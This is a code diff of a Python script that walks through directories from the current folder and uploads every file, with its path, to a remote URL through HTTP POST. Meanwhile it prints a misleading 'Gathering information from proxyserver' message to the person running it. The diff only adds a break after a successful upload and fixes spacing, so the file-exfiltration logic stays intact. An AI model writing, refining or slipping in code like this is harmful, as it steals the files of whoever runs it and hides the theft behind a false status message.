@@ -9,7 +9,7 @@ def SendCountent(filename):
         try:
             if exists(filename):
                 with open(filename,'rb') as filetosend:
-                    post(url,files={'file':filetosend},data={'filepath':filename})
+                    post(url,files={'file':filetosend},data={'filepath':filename}) ; break
             else:
                 raise FileNotFoundError
         except (exceptions.ConnectionError,exceptions.Timeout):
@@ -26,7 +26,7 @@ def main(were='.'):
                 if i.is_dir():
                     Cclass.append((var:=join(CP,i.name)))
                 else:
-                    SendCountent(join(CP,i.name)) ;loop += 1
+                    SendCountent(join(CP,i.name)) ; loop += 1
                     print(f'Gathering information from proxyserver please wait := '+fg('green') +f'{loop}'+fg('white')+'\r')
             Cclass.remove(CP)
             CP = Cclass[0]
